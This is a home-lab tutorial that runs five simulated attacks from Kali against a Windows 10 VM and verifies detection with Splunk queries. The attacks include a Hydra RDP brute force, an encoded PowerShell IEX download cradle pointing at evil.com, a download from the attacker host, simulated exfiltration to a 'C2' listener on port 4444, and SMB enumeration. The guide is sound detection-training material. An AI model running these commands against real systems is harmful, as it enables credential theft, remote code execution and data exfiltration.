# 🔴 Phase 5: Attack Scenarios - Step-by-Step Guide

This guide walks you through executing each attack scenario and verifying detection in Splunk.

## 📋 Prerequisites Checklist

Before starting, verify:

- [/] All VMs are powered on and networked
- [/] Splunk is running on Ubuntu Server (192.168.1.7)
- [/] Windows 10 VM has Splunk UF running and forwarding logs
- [/] Sysmon is installed and running on Windows 10
- [/] You can access Splunk Web UI at `http://192.168.1.7:8000`
- [/] You can see logs in Splunk (test with: `index=windows_security OR index=sysmon | head 10`)

---

## 🔴 Scenario 1: Brute Force Attack (Credential Access)

### Objective
Simulate a brute force attack from Kali against Windows 10 to generate failed login events.

### Step 1: Prepare Windows 10 VM

1. **Enable RDP (if not already enabled):**
   ```powershell
   # Run as Administrator
   Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
   Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
   ```

2. **Create a test account (optional, for safer testing):**
   ```powershell
   # Run as Administrator
   net user testuser TestPass123! /add
   ```

3. **Verify RDP is accessible:**
   - From Kali, test: `nmap -p 3389 192.168.1.5`

### Step 2: Execute Attack from Kali Linux

1. **SSH into Kali or open terminal**

2. **Run Hydra brute force attack:**
   ```bash
   # Limited attack (use small wordlist for testing)
   hydra -l admin -P /usr/share/wordlists/rockyou.txt rdp://192.168.1.5 -t 4 -V
   
   # OR use a smaller wordlist for faster testing
   echo -e "password\n123456\nadmin\npassword123" > /tmp/small_wordlist.txt
   hydra -l admin -P /tmp/small_wordlist.txt rdp://192.168.1.5 -t 4 -V
   ```

   **Note:** This will generate multiple failed login attempts (Event ID 4625)

3. **Let it run for 30-60 seconds, then stop with `Ctrl+C`**

### Step 3: Verify in Splunk

1. **Open Splunk Web UI:** `http://192.168.1.7:8000`

2. **Search for failed logins:**
   ```spl
   index=windows_security EventCode=4625
   | head 20
   ```

3. **Run the detection query:**
   ```spl
   index=windows_security EventCode=4625
   | stats count by Account_Name, src_ip
   | where count > 5
   ```

4. **What to look for:**
   - Multiple Event ID 4625 entries
   - Source IP should be `192.168.1.4` (Kali)
   - Account name should be `admin` (or whatever username you used)
   - Count should be > 5

5. **Timeline view:**
   ```spl
   index=windows_security EventCode=4625
   | timechart count by Account_Name
   ```

### ✅ Success Criteria
- [ ] See multiple Event ID 4625 events in Splunk
- [ ] Detection query shows count > 5 for the attacking IP
- [ ] Source IP matches Kali (192.168.1.4)

---

## 🔴 Scenario 2: Suspicious PowerShell (Encoded Command)

### Objective
Execute encoded PowerShell command to simulate obfuscated malicious activity.

### Step 1: Execute on Windows 10 VM

1. **Open PowerShell (as regular user, not admin)**

2. **Run the encoded PowerShell command:**
   ```powershell
   powershell -enc SQBFAFgA
   ```
   
   **What this does:** This is base64-encoded `IEX` (Invoke-Expression), a common technique used by attackers to obfuscate commands.

3. **Run a few more suspicious PowerShell commands:**
   ```powershell
   # Encoded command
   powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=
   
   # Download and execute (simulated)
   powershell -Command "Invoke-WebRequest -Uri http://192.168.1.4/test.ps1 -OutFile C:\temp\test.ps1"
   ```

### Step 2: Verify in Splunk

1. **Search for PowerShell process creation:**
   ```spl
   index=sysmon EventCode=1 Image="*powershell.exe"
   | head 20
   ```

2. **Run the detection query:**
   ```spl
   index=sysmon EventCode=1 Image="*powershell.exe" CommandLine="*-enc*"
   ```

3. **What to look for:**
   - Event ID 1 (Process Creation)
   - Image field contains `powershell.exe`
   - CommandLine field contains `-enc`
   - Parent process information

4. **Enhanced detection (look for suspicious patterns):**
   ```spl
   index=sysmon EventCode=1 Image="*powershell.exe"
   | where CommandLine LIKE "%enc%" OR CommandLine LIKE "%download%" OR CommandLine LIKE "%invoke%"
   | table _time, Image, CommandLine, ParentImage, User
   ```

### ✅ Success Criteria
- [ ] See Sysmon Event ID 1 entries for PowerShell
- [ ] CommandLine field shows `-enc` parameter
- [ ] Detection query returns results

---

## 🔴 Scenario 3: Privilege Escalation Attempt

### Objective
Simulate adding a user to the administrators group (privilege escalation).

### Step 1: Prepare Windows 10 VM

1. **Create a test user (if not exists):**
   ```powershell
   # Run as Administrator
   net user testuser TestPass123! /add
   ```

### Step 2: Execute Privilege Escalation

1. **Open PowerShell as Administrator**

2. **Add user to administrators group:**
   ```powershell
   net localgroup administrators testuser /add
   ```

3. **Verify the change:**
   ```powershell
   net localgroup administrators
   ```

### Step 3: Verify in Splunk

1. **Search for privilege escalation events:**
   ```spl
   index=windows_security EventCode=4728
   | head 10
   ```

2. **Run the detection query:**
   ```spl
   index=windows_security EventCode=4728
   | stats count by MemberName, SubjectUserName
   ```

3. **What to look for:**
   - Event ID 4728 (Member added to security-enabled local group)
   - MemberName should be `testuser`
   - SubjectUserName shows who made the change
   - GroupName should be `Administrators`

4. **Detailed view:**
   ```spl
   index=windows_security EventCode=4728
   | table _time, MemberName, SubjectUserName, GroupName, TargetUserName
   ```

### ✅ Success Criteria
- [ ] See Event ID 4728 in Splunk
- [ ] MemberName shows the user that was added
- [ ] Detection query returns the event

---

## 🔴 Scenario 4: Lateral Movement (SMB Access)

### Objective
Simulate lateral movement by accessing Windows shares from Kali.

### Step 1: Prepare Windows 10 VM

1. **Enable File and Printer Sharing:**
   ```powershell
   # Run as Administrator
   Enable-NetFirewallRule -DisplayGroup "File and Printer Sharing"
   ```

2. **Create a test share (optional):**
   ```powershell
   # Run as Administrator
   New-Item -Path C:\TestShare -ItemType Directory
   New-SmbShare -Name TestShare -Path C:\TestShare -FullAccess Everyone
   ```

3. **Create a test user for SMB access:**
   ```powershell
   # Run as Administrator
   net user smbuser TestPass123! /add
   ```

### Step 2: Execute from Kali Linux

1. **SSH into Kali or open terminal**

2. **Install SMB client (if not installed):**
   ```bash
   sudo apt update
   sudo apt install smbclient -y
   ```

3. **Attempt SMB connection:**
   ```bash
   # List shares
   smbclient -L //192.168.1.5 -U smbuser
   # When prompted, enter password: TestPass123!
   
   # Try to connect to a share
   smbclient //192.168.1.5/TestShare -U smbuser
   # Enter password when prompted
   # Type 'ls' to list files
   # Type 'exit' to disconnect
   ```

4. **Alternative: Use nmap to enumerate SMB:**
   ```bash
   nmap --script smb-enum-shares.nse -p 445 192.168.1.5
   ```

### Step 3: Verify in Splunk

1. **Search for network logons:**
   ```spl
   index=windows_security EventCode=4624 Logon_Type=3
   | head 20
   ```

2. **Run the detection query:**
   ```spl
   index=windows_security EventCode=4624 Logon_Type=3
   | stats count by src_ip, Account_Name
   | sort -count
   ```

3. **What to look for:**
   - Event ID 4624 (Successful logon)
   - Logon_Type = 3 (Network logon)
   - Source IP should be `192.168.1.4` (Kali)
   - Account_Name should be `smbuser`

4. **Timeline of SMB access:**
   ```spl
   index=windows_security EventCode=4624 Logon_Type=3
   | timechart count by src_ip
   ```

### ✅ Success Criteria
- [ ] See Event ID 4624 with Logon_Type=3
- [ ] Source IP matches Kali (192.168.1.4)
- [ ] Account name matches the user used for SMB access

---

## 🔴 Scenario 5: Data Exfiltration Simulation

### Objective
Simulate data exfiltration by making suspicious outbound network connections.

### Step 1: Prepare Kali Linux (as C2 Server)

1. **Start a simple HTTP server on Kali:**
   ```bash
   # On Kali Linux
   python3 -m http.server 8080
   # Keep this running in a terminal
   ```

### Step 2: Execute on Windows 10 VM

1. **Open PowerShell (as regular user)**

2. **Simulate data exfiltration:**
   ```powershell
   # Attempt connection to Kali (simulating C2)
   Invoke-WebRequest -Uri http://192.168.1.4:8080/upload -Method POST -Body "test data"
   
   # Alternative: Use Test-NetConnection
   Test-NetConnection -ComputerName 192.168.1.4 -Port 8080
   
   # Create suspicious outbound connection
   $client = New-Object System.Net.Sockets.TcpClient("192.168.1.4", 4444)
   $client.Close()
   ```

3. **Generate more network activity:**
   ```powershell
   # Multiple connections to non-standard ports
   for ($i=1; $i -le 5; $i++) {
       Test-NetConnection -ComputerName 192.168.1.4 -Port (8000 + $i)
   }
   ```

### Step 3: Verify in Splunk

1. **Search for network connections:**
   ```spl
   index=sysmon EventCode=3
   | head 20
   ```

2. **Run the detection query:**
   ```spl
   index=sysmon EventCode=3
   | stats count by Image, DestinationIp, DestinationPort
   | where DestinationPort != 53 AND DestinationPort != 80 AND DestinationPort != 443
   | sort -count
   ```

3. **What to look for:**
   - Event ID 3 (Network Connection)
   - DestinationIp should be `192.168.1.4` (Kali)
   - DestinationPort should be non-standard (8080, 4444, etc.)
   - Image field shows the process making the connection

4. **Enhanced detection (suspicious outbound to attacker IP):**
   ```spl
   index=sysmon EventCode=3 DestinationIp=192.168.1.4
   | where DestinationPort != 53 AND DestinationPort != 80 AND DestinationPort != 443 AND DestinationPort != 3389
   | table _time, Image, DestinationIp, DestinationPort, Protocol, Initiated
   ```

5. **Check for PowerShell making connections:**
   ```spl
   index=sysmon EventCode=3 Image="*powershell.exe"
   | stats count by DestinationIp, DestinationPort
   ```

### ✅ Success Criteria
- [ ] See Sysmon Event ID 3 entries
- [ ] Destination IP matches Kali (192.168.1.4)
- [ ] Non-standard ports are detected
- [ ] Detection query filters out normal traffic (DNS, HTTP, HTTPS)

---

## 📊 Verification Checklist

After completing all scenarios, verify:

### General Verification
- [ ] All scenarios executed successfully
- [ ] Logs appear in Splunk within 1-2 minutes
- [ ] Detection queries return expected results
- [ ] No false positives from normal system activity

### Splunk Index Verification
```spl
# Check data is flowing
index=windows_security OR index=sysmon
| stats count by index, sourcetype
| sort -count
```

### Timeline Verification
```spl
# See all security events over time
index=windows_security OR index=sysmon
| timechart count by index
```

---

## 🐛 Troubleshooting

### No logs appearing in Splunk?

1. **Check Splunk Forwarder status on Windows:**
   ```powershell
   Get-Service SplunkForwarder
   # Should be "Running"
   ```

2. **Check forwarding configuration:**
   ```powershell
   # View outputs.conf
   type "C:\Program Files\SplunkUniversalForwarder\etc\system\local\outputs.conf"
   ```

3. **Test connectivity:**
   ```powershell
   Test-NetConnection -ComputerName 192.168.1.7 -Port 9997
   ```

4. **Check Splunk receiving on Ubuntu:**
   ```bash
   # On Ubuntu Server
   sudo /opt/splunk/bin/splunk list listen
   ```

### Sysmon not generating events?

1. **Check Sysmon service:**
   ```powershell
   Get-Service Sysmon
   # Should be "Running"
   ```

2. **Check Sysmon configuration:**
   ```powershell
   sysmon -c
   ```

3. **View Sysmon events in Event Viewer:**
   - Open Event Viewer
   - Navigate to: Applications and Services Logs → Microsoft → Windows → Sysmon → Operational

### Detection queries not working?

1. **Check field names:**
   ```spl
   # See what fields are available
   index=windows_security EventCode=4625
   | head 1
   | fieldsummary
   ```

2. **Field names might be different:**
   - `src_ip` might be `Source_Network_Address` or `IpAddress`
   - `Account_Name` might be `TargetUserName` or `Account`
   - Adjust queries based on actual field names

---

## 📝 Documentation Notes

After completing each scenario, document:

1. **Timestamp** of when you executed the attack
2. **Number of events** generated
3. **Detection query results**
4. **Any issues encountered**
5. **Screenshots** of Splunk results (for portfolio)

---

## 🎯 Next Steps After Phase 5

Once all scenarios are working:

1. **Phase 6:** Create Splunk alerts based on these detection queries
2. **Phase 7:** Build dashboards visualizing these attacks
3. **Phase 8:** Write incident response playbooks for each scenario
4. **Phase 9:** Document everything for your portfolio

Good luck! 🚀

